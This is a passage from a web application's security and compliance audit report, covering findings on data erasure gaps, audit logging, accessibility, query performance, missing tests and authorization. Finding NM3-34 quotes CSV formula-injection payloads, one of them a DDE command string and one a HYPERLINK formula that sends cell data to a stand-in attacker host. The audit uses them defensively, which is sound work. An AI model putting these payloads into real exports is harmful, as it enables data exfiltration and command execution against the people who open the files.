Add a PostgreSQL full-text search index: CREATE INDEX pages_text_search_idx ON pages USING gin(to_tsvector('simple', coalesce(text_content, ''))). Use Prisma raw SQL or the @db.Text column with a raw query for GIN-based search. Alternatively, scope the search to sections/notebooks the user owns first (inner join), then apply the text predicate — the current nested-join approach forces the planner to join all notebooks before filtering.

---

### NM3-15 — No tests for the cross-user privacy gates on activity-heatmap and achievements routes — NM-H3/H4 fixes are unverified by automated tests

- **Severity:** Medium
- **Lens:** qa
- **Category:** Test Coverage / Privacy / Authorization
- **Location:** `app/api/user/activity-heatmap/route.ts:36`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The prior audit found NM-H3 and NM-H4 as High-severity unauthenticated PII disclosure bugs. Both have been fixed: `activity-heatmap` now requires auth and checks `profilePrivate` + accepted friendship; `achievements` checks `profilePrivate` + `hideAchievements`. However, there are zero automated tests that would catch a regression. Any future refactor of these routes — changing the branch logic, modifying the `targetUserId !== authUserId` condition, or altering the friendship query — would not be caught by the `api-auth-coverage` test (which only checks that `getAuthUserId` appears in the file). The four-case matrix (unauthenticated, self, public stranger, private stranger, accepted friend) is untested.

**Evidence**

```
`find apps/web/src -name '*.test.ts' | xargs grep -l 'profilePrivate|hideAchievements|cross.*user|targetUserId|friendship'` returns no output. The `api-auth-coverage` test at line 69 only regex-scans for `getAuthUserId` — both routes contain it, so they pass the scan regardless of whether the cross-user privacy branch is present or correct.
```

**Remediation**

Write tests for `GET /api/user/activity-heatmap` and `GET /api/user/achievements` covering: (1) no session → 401; (2) `?userId=<self>` → 200 with own data; (3) `?userId=<other>` with `profilePrivate=false`, `hideAchievements=false` → 200 with target data; (4) `?userId=<other>` with `profilePrivate=true` and no accepted friendship → 403/empty; (5) `?userId=<other>` with `profilePrivate=true` and accepted friendship → 200; (6) `?userId=<other>` with `hideAchievements=true` → empty. Mock `db.user.findUnique` and `db.friendship.findFirst` per case.

---

### NM3-16 — Account deletion orphans all Supabase Storage files (uploaded PDFs, page/flashcard images, public avatars) — erasure is incomplete

- **Severity:** Medium *(verifier adjusted from High)*
- **Lens:** privacy, compliance *(reported by 2 lenses)*
- **Category:** GDPR Art.17 Right to Erasure / CCPA Right to Delete — data-deletion completeness
- **Location:** `app/api/user/delete-account/route.ts:12`
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

The delete-account handler runs only `db.user.delete({ where:{ id:userId } })`, which cascades the Postgres rows but never touches Supabase Storage. User-uploaded source documents (`documents/<notebookId>/...`), page images (`images/<pageId>/...`), flashcard images (`flashcard-images/...`) and — critically — the user's avatar (uploaded to the PUBLIC bucket via `uploadPublicFile`, line 82-90 of storage.ts) all remain in storage indefinitely after the account is deleted. The avatar (often a real face photo) stays retrievable at a stable, unauthenticated public URL forever. This directly contradicts the published Privacy Policy promise: 'If you delete your account, we delete or anonymise your personal data.' The codebase already ships the exact helpers to do this correctly (`deleteDirectory`, `deleteNotebookFiles`, `deletePageImages`, `deleteFile` in storage.ts) — they are simply never called from the deletion path. A data-subject erasure request therefore leaves substantial personal data (their entire uploaded corpus + facial avatar) live.

**Evidence**

```
// apps/web/app/api/user/delete-account/route.ts
// Cascade delete handles all related records
await db.user.delete({ where: { id: userId } });
return successResponse({ deleted: true });
// No call to deleteDirectory()/deleteNotebookFiles() — Supabase Storage objects (documents/, images/, flashcard-images/, public-bucket avatars) are orphaned.
```

**Remediation**

Before/after `db.user.delete`, enumerate the user's notebooks + pages and call the existing `deleteNotebookFiles`/`deletePageImages`/`deleteDirectory` helpers for every owned storage prefix, and `deleteFile` (against the public bucket) for the avatar. Prefer a transactional/queued job so a storage error doesn't abort the DB delete (and vice-versa). Add an integration test asserting no objects remain under the user's prefixes post-deletion.

---

### NM3-17 — File input without label or aria-label in waitlist form

- **Severity:** Medium
- **Lens:** accessibility
- **Category:** Form Labels & Instructions
- **Location:** `app/waitlist/page.tsx:186`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

The email input in the waitlist form lacks a visible label and the error message displayed below is not properly associated via aria-describedby, making it harder for screen reader users to understand form errors.

**Evidence**

```
<input type="email" placeholder="Enter your email" value={email} onChange={...} required ... /> followed by error message <p>{errorMsg}</p> without aria-describedby or aria-invalid
```

**Remediation**

Add aria-label="Email address" to the input, generate a unique id for the error message, add aria-describedby referencing it, and add aria-invalid={status === 'error' ? 'true' : 'false'} to the input.

---

### NM3-18 — Registration IP addresses are retained 12 months in `IpRegistration` with no user link and survive account erasure

- **Severity:** Medium
- **Lens:** privacy
- **Category:** GDPR Art.17/Art.13 — retained personal data not erased on deletion + under-disclosed retention
- **Location:** `prisma/schema.prisma:1652`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

`enforceIpCap` writes the raw client IP at every registration into the `IpRegistration` table (stored 12 months, queried for the 'max 3 accounts per IP' rule). The model has only `id/ip/createdAt` — no `userId` FK and no cascade — so when a user deletes their account, the IP captured at their signup persists for up to 12 months with no way to locate or purge it as part of their erasure. An IP address is personal data under GDPR; this is an incomplete-erasure gap. It is also under-disclosed: the Privacy Policy's prominent IP statement says the IP 'is not stored or logged' (that sentence is scoped to the pricing/geolocation use), and the general 'usage and technical data' line mentions IP only loosely 'for security' without stating a 12-month retention of registration IPs.

**Evidence**

```
model IpRegistration {
  id        String   @id @default(cuid())
  ip        String // Client IP at registration time
  createdAt DateTime @default(now())
  @@index([ip, createdAt])
}
// No userId relation / onDelete cascade → not reachable by user.delete() erasure; retained 12 months (registration.ts:45-53).
```

**Remediation**

Either (a) store a salted hash of the IP rather than the raw value (the cap only needs equality/count, which a keyed hash preserves) and document the retention, or (b) add a userId FK with onDelete: Cascade so erasure clears it, plus a scheduled purge of rows older than 12 months. Update the Privacy Policy to disclose that registration IPs are retained for anti-abuse for up to 12 months and the legal basis (legitimate interests).

---

### NM3-19 — Admin audit log is destroyed when the admin account is deleted (cascade wipes the trail)

- **Severity:** Medium
- **Lens:** compliance
- **Category:** SOC 2 CC7.x / Audit Trail Integrity
- **Location:** `prisma/schema.prisma:1701`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06) — adminId nullable + FK `ON DELETE SET NULL`; migration `20260609000000_audit_indexes_and_auditlog_setnull`.

**Impact / attack scenario**

`AdminAuditLog.admin` is defined with `onDelete: Cascade`, so deleting an admin user cascades and removes ALL of that admin's audit-log rows. The admin user-deletion route (apps/web/app/api/admin/users/[id]/route.ts) lets one admin delete another non-admin, and self-deletion is possible via the normal delete-account route. A compromised or malicious admin can erase the entire record of their privileged actions (bans, deletions, cosmetic grants, path approvals/rejections) simply by deleting the actor account. An audit log that the actor can unilaterally destroy provides no forensic or SOC 2 evidentiary value.

**Evidence**

```
admin User @relation("AdminAuditLogs", fields: [adminId], references: [id], onDelete: Cascade)
```

**Remediation**

Change the relation to `onDelete: SetNull` (make `adminId` nullable, retaining the action history with a tombstoned actor) or `onDelete: Restrict`, or replicate audit records to append-only/WORM storage outside the primary DB. Audit logs must survive deletion of the subject.

---

### NM3-20 — No authentication/security event audit log (failed logins, lockouts, OAuth linking, privilege use)

- **Severity:** Medium
- **Lens:** compliance
- **Category:** SOC 2 CC6.1/CC7.2 / Audit Logging
- **Location:** `src/auth/config.ts:184`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The only persistent audit table is `AdminAuditLog`, which records a narrow set of admin moderation actions. There is no durable security-event log for authentication: successful logins, failed-login attempts, account lockouts (config.ts:184-202), email/password changes, OAuth account creation/linking (config.ts:297), or session events are not written to any queryable store — failures only hit `console.error`, which is ephemeral container output on Coolify. For SOC 2 (logging & monitoring), incident response, and GDPR breach-investigation/Art. 33 72-hour notification readiness, the absence of a tamper-resistant authentication event trail means a credential-stuffing campaign, account takeover, or insider access cannot be reconstructed or evidenced.

**Evidence**

```
// failed-login increment + lockout happen via $queryRaw with no audit record:
UPDATE users SET "failedLoginAttempts" = ... // outcome never persisted to an audit/security log
```

**Remediation**

Persist authentication and security-relevant events (login success/failure with IP, lockout, password reset, OAuth link/create, admin elevation, subscription changes) to an append-only audit table or external SIEM, with retention aligned to the policy. Add alerting on lockout/anomaly thresholds.

---

### NM3-21 — Form error messages not associated with inputs via aria-describedby

- **Severity:** Medium *(verifier adjusted from High)*
- **Lens:** accessibility
- **Category:** Form Labels & Instructions
- **Location:** `src/components/features/ExamForm.tsx:202`
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

Error messages displayed below form inputs are not programmatically associated with their corresponding inputs. Screen reader users won't be automatically notified that an input has an error, and the relationship between the error and the field is implicit rather than explicit.

**Evidence**

```
Input elements lack aria-describedby attribute pointing to their error message paragraphs. Error messages are displayed as <p> elements with no id attribute and no aria-invalid on the inputs.
```

**Remediation**

Add unique ids to error message elements (e.g., id="title-error") and add aria-describedby="title-error" to the corresponding input. Also add aria-invalid="true" to invalid inputs and aria-invalid="false" to valid ones.

---

### NM3-22 — File upload button lacks keyboard accessibility and semantic role

- **Severity:** Medium *(verifier adjusted from High)*
- **Lens:** accessibility
- **Category:** Keyboard Navigation & Operability
- **Location:** `src/components/learn/ChatThread.tsx:1372` *(verifier-corrected from src/components/learn/ChatThread.tsx:1360)*
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

A div element with onClick handler simulates a button but lacks role="button", keyboard event handlers (onKeyDown), and tabindex support. Keyboard-only users cannot interact with this control using Tab to focus and Enter/Space to activate.

**Evidence**

```
<div onDragOver={...} onDragLeave={...} onDrop={...} onClick={() => fileInputRef.current?.click()} style={{...}} > - Missing role="button" and keyboard handlers; should be a <button> element instead
```

**Remediation**

Replace the div with a proper <button> element, or add role="button" tabindex="0" onKeyDown={(e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); fileInputRef.current?.click(); } }} to the div.

---

### NM3-23 — Video thumbnail image has empty alt text

- **Severity:** Medium
- **Lens:** accessibility
- **Category:** Non-Text Content (Images)
- **Location:** `src/components/learn/ChatThread.tsx:1754`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

The video thumbnail image has alt="" which means screen readers will announce it as a decorative image. However, it represents actual content (a recommended video) and should have descriptive alt text that includes the video title.

**Evidence**

```
<img src={video.thumbnailUrl} alt="" style={{...}} /> - The thumbnail is content but has empty alt text
```

**Remediation**

Change alt="" to alt={video.title} or alt={`Thumbnail for ${video.title}`} to provide meaningful alternative text for screen reader users.

---

### NM3-24 — Pricing table headers lack scope attributes

- **Severity:** Medium
- **Lens:** accessibility
- **Category:** Tables & Data Associations
- **Location:** `src/components/pricing/FeatureComparison.tsx:238`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

The pricing comparison table's header cells do not use the scope attribute to indicate whether they are column or row headers. This makes it harder for screen reader users to understand the table structure.

**Evidence**

```
<th key={tier} style={{...}}>{tier}</th> - Column headers (Free, Pro) lack scope="col" attribute
```

**Remediation**

Add scope="col" to the tier headers: <th scope="col" key={tier} style={{...}}>{tier}</th>. Also ensure the Feature header in the first column has scope="col".

---

### NM3-25 — Table headers missing scope attribute

- **Severity:** Medium
- **Lens:** accessibility
- **Category:** Tables & Data Associations
- **Location:** `src/components/ui/MarkdownRenderer.tsx:259`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

Tables rendered from Markdown do not have proper header scoping. Screen reader users cannot efficiently navigate tables and may receive unclear context about which headers apply to each cell.

**Evidence**

```
<th style={{...}}>{children}</th> - Missing scope="col" or scope="row" attributes; headers should clarify their relationship to rows and columns
```

**Remediation**

When rendering table headers in the th component, add scope="col" for column headers and scope="row" for row headers: <th scope="col" style={{...}}>{children}</th>

---

### NM3-26 — gatherUserStats issues 14+ parallel DB queries on every achievement check call

- **Severity:** Medium *(verifier adjusted from High)*
- **Lens:** performance
- **Category:** Excessive Database Queries / Hot Path Cost
- **Location:** `src/lib/achievement-checker.ts:21`
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

checkAndUnlockAchievements fires synchronously (fire-and-forget) on notebook create, exam create, group create, quiz attempt, and every chat POST. gatherUserStats issues 14 queries in the first Promise.all, then 4 more in a second Promise.all, then 4 more in a third Promise.all, then the per-attempt N+1 loop (finding #1 above), then two more raw SQL queries = approximately 22+ DB round-trips per single user action. Even though it is fire-and-forget, these queries run concurrently with the response and compete for DB connections, adding real database pressure on every write action in the app.

**Evidence**

```
const [
  notebookCount, streak, friendCount, sharedNotebookCount, groupCount, allWrongAttempt, userRecord,
  examCount, folderCount, sharedStudyMaterialCount, canvasPageCount, totalTodos, incompleteTodos, unlockedCount,
] = await Promise.all([
  db.notebook.count(...), db.userStreak.findUnique(...), db.friendship.count(...), ...
]);
// Then second batch:
const [chatMessageCount, flashcardReviewAgg, documentCount, quizSetCount] = await Promise.all([...]);
// Then third batch:
const [perfectQuizRow, phaseComplete, pathComplete, checkpointAceRow] = await Promise.all([...]);
```

**Remediation**

1. Cache the UserStats result in Redis (or the DB itself as a denormalized JSON column) with a short TTL (e.g. 30 seconds to 5 minutes). Re-compute only when triggered by a relevant event category, not on every write. 2. Consolidate the three Promise.all batches and the N+1 loop into a single batch query call. 3. Consider replacing fine-grained counters with event-sourced denormalized columns (like maxQuizStreakEver and everHadComeback already are) that are updated only when a specific trigger fires, avoiding the need for full stat gathering entirely.

---

### NM3-27 — Minimum-age gate is 13 while the Privacy Policy targets a 16+ digital-consent age, with no parental-consent path for 13-15

- **Severity:** Medium
- **Lens:** privacy, compliance *(reported by 2 lenses)*
- **Category:** GDPR Art.8 (children's consent) — age gate vs disclosed policy mismatch
- **Location:** `src/lib/age.ts:8`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

`MIN_AGE = 13` is enforced at credentials signup and on the OAuth birth-date onboarding step. But the Privacy Policy states the Service 'is not directed to children under the age required to consent to data processing in their country (16 in many places)' and the Children section presumes a 16 threshold. Under GDPR Art.8, several EU member states (including Germany — where the hosting provider and, per the policy, data processing sit — plus NL, etc.) set the digital-consent age at 16; processing a 13-15 year-old's data on a consent/contract basis there requires verifiable parental consent, which the app never collects. The result is a documented policy/implementation contradiction and a likely lawful-basis gap for 13-15 year-old EU users. (The product also processes their content via US AI providers, raising the stakes.)

**Evidence**

```
// apps/web/src/lib/age.ts
export const MIN_AGE = 13;
// vs privacy.en.md: 'Notemage is not directed to children under the age required to consent ... (16 in many places).'
```

**Remediation**

Decide one age policy and make code + policy agree. Either raise MIN_AGE to 16 for jurisdictions that require it (country-aware gate), or keep 13 globally but add a verifiable parental-consent flow for users under the local digital-consent age and reflect that in the Privacy Policy's Children section. At minimum, align the policy text with the actual 13+ gate to remove the contradiction.

---

### NM3-28 — The billing-sync ownership-verification path (`syncOwnerMatchesCaller`) is untested — no test covers the forgery-rejection or the fallback customer-id path

- **Severity:** Medium
- **Lens:** qa
- **Category:** Test Coverage / Payment Authorization
- **Location:** `src/lib/lemonsqueezy.ts:179`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The prior audit found NM-H1 (self-upgrade via forged LS subscription ID). The fix lives in `syncOwnerMatchesCaller` at `src/lib/lemonsqueezy.ts:179` and the updated `/sync` route that returns 403 when the function returns false. This is a critical security control with two independent code paths: (a) `sub.userId` present → exact match required; (b) `sub.userId` absent → customer ID must already be bound to the caller. There are no unit tests for `syncOwnerMatchesCaller`, no tests for `syncLemonSqueezyAfterCheckout` (the caller), and no integration tests for `POST /api/billing/lemonsqueezy/sync`. A regression in path (b) — e.g. if `db.user.findUnique` returns `undefined` instead of `null` and the function returns `true` — would silently re-open the self-upgrade vector.

**Evidence**

```
`find apps/web/src -name '*.test.ts' | xargs grep -l 'syncOwnerMatchesCaller|syncLemonSqueezy|lemonsqueezy.*sync|self.*upgrade|subscription.*belongs'` returns no output. The function at `src/lib/lemonsqueezy.ts:179` is an unexported async function with a DB call — it can be tested by exporting it for tests or by testing through `syncLemonSqueezyAfterCheckout`.
```

**Remediation**

Export `syncOwnerMatchesCaller` (or test through `syncLemonSqueezyAfterCheckout`) and write tests covering: (1) `sub.userId` matches `callerId` → returns true; (2) `sub.userId` does not match → returns false (the forgery rejection); (3) `sub.userId` is null, caller's `lemonSqueezyCustomerId` matches `sub.customerId` → returns true; (4) `sub.userId` is null, no matching customer in DB → returns false; (5) Integration test for `POST /api/billing/lemonsqueezy/sync` with a mismatched subscription → 403.

---

### NM3-29 — quiz-grading.test.ts covers only the `equation` kind — 10 of 11 grading branches are untested, including the security-sensitive `code_write` pass-through

- **Severity:** Medium
- **Lens:** qa
- **Category:** Test Coverage / Grading Correctness
- **Location:** `src/lib/quiz-grading.test.ts:8`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The `grade()` function in `quiz-grading.ts` handles 11 question kinds (`mc`, `fill_blank`, `translation`, `word_bank`, `match_pairs`, `sentence_reorder`, `equation`, `true_false`, `code_output`, `timeline`, `code_write`). Only `equation` has test coverage. The `code_write` branch at line 174-182 trusts `userAnswer.passed === true` from the submitted payload when Piston is not configured (`isPistonConfigured() === false`). No test covers the Piston-absent fallback path to verify it falls back to the client-supplied `passed` field rather than defaulting to false. No test covers `mc` correctIndex matching, `fill_blank` Levenshtein threshold, `match_pairs` cross-product matching, or `timeline` ordering — any of these could silently mis-grade. The `exhaustive` default branch throw at line 184 is also untested.

**Evidence**

```
File `apps/web/src/lib/quiz-grading.test.ts` contains exactly one `describe` block: `describe('grade() — equation kind', ...)`. `grep -c 'code_write' apps/web/src/lib/quiz-grading.test.ts` returns 0. The `case 'code_write'` branch at `apps/web/src/lib/quiz-grading.ts:174` is exercised by the attempts route only at runtime; `isPistonConfigured()` returns `false` in test environments because `PISTON_URL` is not documented in `.env.example` and is absent from CI env vars.
```

**Remediation**

Extend `quiz-grading.test.ts` to cover all 11 kinds. Critical additions: (1) `mc` — correct index → true, wrong index → false, out-of-bounds index → false; (2) `fill_blank` — exact match → true, near-match within Levenshtein threshold → true, far-off → false; (3) `code_write` with `passed: true` → `isCorrect: true`, with `passed: false` → `isCorrect: false` (documents and pins the Piston-absent fallback contract); (4) `match_pairs` — all pairs matched → true, one wrong pair → false; (5) default unknown kind → throws. These are all pure-function tests with no DB mocking needed.

---

### NM3-30 — No /api/* authentication or defense-in-depth layer — every API route's authz is a single load-bearing handler check

- **Severity:** Medium
- **Lens:** architecture
- **Category:** A01:2021 Broken Access Control (architectural / defense-in-depth)
- **Location:** `src/middleware.ts:147`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The middleware short-circuits at line 147 with `if (!isAuthLogicRoute(pathname)) return withSecurityHeaders(NextResponse.next())`, and AUTH_LOGIC_PATTERNS (lines 94-103) contains only page prefixes (/, /auth, /dashboard, /notebooks, /settings, /pricing, /legal, /docs) — never `/api`. So every API route falls through with security headers only and ZERO framework-level auth gate. The entire `/api` trust boundary therefore rests on each handler remembering to call getAuthUserId + scope its DB query correctly. There is no second layer: a single forgotten or mis-scoped check in any one of ~180 route files is a full vulnerability with nothing behind it. This is the demonstrated structural root cause of both 2026-06-06 pentest findings (the assessment route trusting body.score, and the unscoped temp-imports prefix) — each is one handler deviating from the pattern, with no backstop. As the surface keeps growing this coupling makes a class of IDOR/authz regressions inevitable.

**Evidence**

```
if (!isAuthLogicRoute(pathname)) {
    return withSecurityHeaders(NextResponse.next());
}
// AUTH_LOGIC_PATTERNS = [ /^\/$/, /^\/auth\/(login|register)(\/|$)/, /^\/dashboard(\/|$)/, /^\/notebooks\//, /^\/settings(\/|$)/, ... ]  — no /api entry
```

**Remediation**

Add an `/api` branch to the middleware that 401s unauthenticated requests against an explicit public allowlist (/api/auth/*, billing webhooks, health, /api/waitlist, etc.), giving a uniform first-layer gate behind which each handler's own ownership scoping becomes defense-in-depth rather than the sole control. Complement with a CI invariant (lint rule or test) asserting every `app/api/**/route.ts` handler references an auth helper, so a new route can't ship unauthenticated. This was filed as NM-M1 in the 2026-05-31 audit and remains unfixed on the current tree.

---

## 🟦 Low

### NM3-31 — Admin reads of bulk user PII (emails) are not audit-logged

- **Severity:** Low
- **Lens:** compliance
- **Category:** SOC 2 CC6.1 / PII Access Logging
- **Location:** `app/api/admin/users/route.ts:33`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

The admin user-list endpoint returns every user's email, name, username, and ban reason (lines 36-58) in paginated bulk, and the admin ticket-detail endpoint also exposes author emails (apps/web/app/api/admin/tickets/[id]/route.ts:71). These privileged reads of personal data are gated by `getAdminUserId` but produce NO `logAdminAction` record (only mutating admin actions are logged). For SOC 2 access-monitoring and GDPR accountability, there is no trail of which admin viewed/exported which users' PII, so insider misuse of the admin console (scraping the user base, targeted lookup) is invisible.

**Evidence**

```
const [users, total] = await Promise.all([
      db.user.findMany({ where, select: { id: true, email: true, name: true, ... } })   // no logAdminAction for the PII read
```

**Remediation**

Log admin reads of bulk/individual user PII (a new AdminAction like 'user.list'/'user.view' with the search term and page) to the audit log, or at minimum sample/throttle and alert on large exports.

---

### NM3-32 — Zero automated tests for billing webhook routes — payment provisioning correctness and HMAC signature verification have no regression coverage

- **Severity:** Low *(verifier adjusted from High)*
- **Lens:** qa
- **Category:** Test Coverage / Payment Critical Path
- **Location:** `app/api/billing/lemonsqueezy/webhook/route.ts:48`
- **Verification:** UNCERTAIN — see reasoning below
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The Lemon Squeezy and RevenueCat webhook routes are the authoritative fulfillment paths for web and iOS payments respectively. A regression in HMAC verification (`timingSafeEqual`), idempotency key derivation (`eventName:subId:status:updated_at`), `isActiveLemonSqueezyStatus` logic, `endSubscription` cross-channel safety, or `activeGrant` could silently grant free PRO or fail to downgrade expired subscribers. The prior audit identified NM-M6 (idempotency key collision on same-second cancellation) as an active bug — there is no test that would prevent a regression or verify the current key now includes `status`. The allowlist in `api-auth-coverage.test.ts` justifies excluding these routes from auth scanning, but provides zero coverage of their actual correctness.

**Evidence**

```
`find apps/web/src -name '*.test.ts' | xargs grep -l 'HMAC|timingSafeEqual|webhook.*secret|provisionFrom|endSubscription|activeGrant|idempotency'` returns only `api-auth-coverage.test.ts` which mentions these routes only to exclude them from the auth scan. The billing webhook routes at `app/api/billing/lemonsqueezy/webhook/route.ts` and `app/api/billing/revenuecat/webhook/route.ts` have zero corresponding test files.
```

**Remediation**

Write unit tests for `apps/web/app/api/billing/lemonsqueezy/webhook/route.ts` and `apps/web/app/api/billing/revenuecat/webhook/route.ts` that mock `db`, `crypto`, and the Lemon Squeezy API. At minimum cover: (1) invalid HMAC → 400; (2) duplicate eventId → 200 with `duplicate:true`; (3) `subscription_created` active status → `provisionFromLemonSqueezySubscription` called with correct args; (4) `subscription_expired` with caller as active source → `endSubscription` drops tier to FREE; (5) `subscription_expired` with different active source → tier left unchanged (cross-channel safety); (6) RC `EXPIRATION` with past `expiration_at_ms` → no grant. Also test `src/lib/entitlement.ts` `endSubscription` and `activeGrant` pure functions directly.

**Verifier note (uncertain):** The finding's FACTS are accurate, but its FRAMING as a High security vulnerability is wrong. I confirmed both files: apps/web/app/api/billing/lemonsqueezy/webhook/route.ts and apps/web/app/api/billing/revenuecat/webhook/route.ts contain exactly the cited logic (HMAC + timingSafeEqual at lines 59-65; idempotency key with status at line 86; isActiveLemonSqueezyStatus + endSubscription cross-channel safety at lines 127-149; RC activeGrant + future-expiry gate at lines 106-119). I also confirmed test coverage: grep -rl across all *.test.ts in apps/web returns ONLY src/__tests__/api-auth-coverage.test.ts, and that file references the two routes ONLY at lines 36-37 as an auth-scan ALLOWLIST (comments noting 'HMAC signature over raw body + timingSafeEqual' / 'constant-time auth-header check'), never exercising their fulfillment logic. No e2e/Playwright/integration harness exists (no playwright.config; test script is just 'vitest run'). So yes — these payment-critical routes have zero correctness/regression tests.

HOWEVER this is a TEST-COVERAGE / PROCESS gap, not a present, exploitable, or even currently-existing defect. The code is correct: the prior audit's two cited motivating bugs are BOTH already fixed in the live code — NM-M6 (idempotency collision) is fixed by including status in the key at line 86 (docs/security-audit-2026-05-31.md:168 confirms the original was Medium), and the RC stale-grant issue is fixed by the future-expiration_at_ms requirement at lines 107-109 (audit line 166, also Medium). The signature/auth verification is correct and an outside attacker cannot forge requests, so there is NO attacker-triggerable vulnerability. The finding itself concedes the harm is hypothetical ('a regression COULD silently grant').

Per the audit's own directive to prefer concrete/exploitable issues over theory, rating an absence-of-tests as 'High' is a severe over-rating. The factual evidence holds, so I won't fully refute; but the security severity is mis-rated and should be Low (a regression-coverage gap on a critical path), not High. File/line (route.ts:48) are valid as the cited handler.

---

### NM3-33 — dashboard Page.count queries traverse a nested join chain (section -> notebook -> userId) with no index

- **Severity:** Low
- **Lens:** performance
- **Category:** Inefficient Query / Missing Index
- **Location:** `app/api/dashboard/route.ts:64`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The dashboard runs two Page.count queries using a nested join: { section: { notebook: { userId } } }. Prisma translates this into a multi-table join (pages JOIN sections JOIN notebooks WHERE notebooks.userId = $1) with a date predicate on pages.updatedAt or pages.createdAt. The pages table has only @@index([sectionId]). There is no index on pages.updatedAt or pages.createdAt, so the date filter requires a sequential scan of all pages reachable via the userId join. This runs in parallel with 5 other queries on every dashboard load.

**Evidence**

```
db.page.count({
  where: {
    updatedAt: { gte: todayStart },
    section: { notebook: { userId } },
  },
}),
db.page.count({
  where: {
    createdAt: { gte: weekStart },
    section: { notebook: { userId } },
  },
}),
// Page model: @@index([sectionId]) only — no updatedAt/createdAt index
```

**Remediation**

Add @@index([sectionId, updatedAt]) and @@index([sectionId, createdAt]) to the Page model, or refactor the query to join via notebookId: store userId directly on Page (denormalized) and add a compound @@index([userId, updatedAt]). A denormalized userId on Page avoids the 2-level JOIN entirely and makes the dashboard queries O(1) with the right index.

---

### NM3-34 — CSV formula injection in group flashcard-set CSV export

- **Severity:** Low
- **Lens:** code-review
- **Category:** A03:2021 Injection (CSV/Formula Injection)
- **Location:** `app/api/groups/[id]/shared/[sharedId]/csv/route.ts:63`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

A flashcard question or answer authored to begin with =, +, -, or @ (e.g. `=cmd|'/c calc'!A1` or `=HYPERLINK("http://attacker/"&A1)`) is written verbatim into the exported CSV. When a group member opens the downloaded `.csv` in Excel/LibreOffice/Google Sheets, the cell is evaluated as a formula — enabling data exfiltration via HYPERLINK/WEBSERVICE or, on misconfigured clients, command execution via DDE. Because flashcards are shared into a study group and any accepted member can download the CSV, a malicious author can target every member of the group with crafted cards.

**Evidence**

```
function escapeCsv(value: string): string {
  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}  // escapes quoting/delimiters but never neutralizes a leading =,+,-,@ formula trigger
```

**Remediation**

Prefix any cell whose first character is one of = + - @ (also tab/CR) with a single quote or a leading space before quoting, e.g. `if (/^[=+\-@\t\r]/.test(value)) value = `'${value}``. Apply inside escapeCsv so every exported cell is neutralized. This is the only server-side CSV producer, so the fix is localized.

---

### NM3-35 — Multi-PDF import 'classify' makes a paid Gemini call but never records token usage (quota under-count)

- **Severity:** Low
- **Lens:** code-review
- **Category:** A04:2021 Insecure Design (cost/quota integrity)
- **Location:** `app/api/import/classify/route.ts:106`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

POST /api/import/classify gates on checkTokenBudget() but, unlike every other AI route in the codebase (essay-check, doc-summarize, ai-inline, chat-stream all call recordTokenUsage/logAiUsage after the model call), it never records the tokens the Gemini Flash-Lite subject-detection call consumes. The monthly token meter (chatMessage.tokens aggregate) therefore never reflects classify spend, so a user can repeatedly fire classification (up to its 10/min rate limit, 20 PDFs each) without it ever counting toward — or being capped by — their monthly budget. It is a COGS/fairness leak (the same class as the prior audit's NM-L3 AI quota under-count), at a site the prior audit did not flag.

**Evidence**

```
const proposed = await detectSubjects(items);  // subject-detect.ts → getGeminiClient(), real Gemini 2.5 Flash-Lite call
// ...route returns successResponse({ groups }) with no recordTokenUsage()/logAiUsage() anywhere; grep -c recordTokenUsage on the file returns 0
```

**Remediation**

Have detectSubjects return its usage (promptTokens/candidatesTokens) and call recordTokenUsage({ userId, tokens, ... }) + logAiUsage(...) after it, mirroring import/commit's per-worker metering and the other AI routes. recordTokenUsage currently requires a notebookId; classify runs before a notebook exists, so allow a null notebookId on the ChatMessage usage row (schema already permits it).

---

### NM3-36 — AI chat message endpoint rate-limited only by spoofable client IP (no per-user limiter)

- **Severity:** Low
- **Lens:** security
- **Category:** OWASP A04:2021 - Insecure Design (missing rate limit on expensive endpoint)
- **Location:** `app/api/learn/chats/[chatId]/messages/route.ts:67`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

This expensive LLM endpoint (delegates to startChatStream → provider calls) is throttled with `rateLimit('ai-chat:${ip}', 20, 60_000)` keyed purely on getClientIp(request). Behind the Coolify/Traefik proxy the IP is derived from forwardable headers (X-Forwarded-For), which a client can rotate to reset the per-IP bucket; there is no per-user limiter on this path. A single authenticated account can therefore exceed the intended 20/min by spoofing the forwarded IP, driving provider cost. The monthly checkTokenBudget cap is the real backstop, so this is a cost-amplification / fairness gap rather than unbounded spend.

**Evidence**

```
const ip = getClientIp(request);
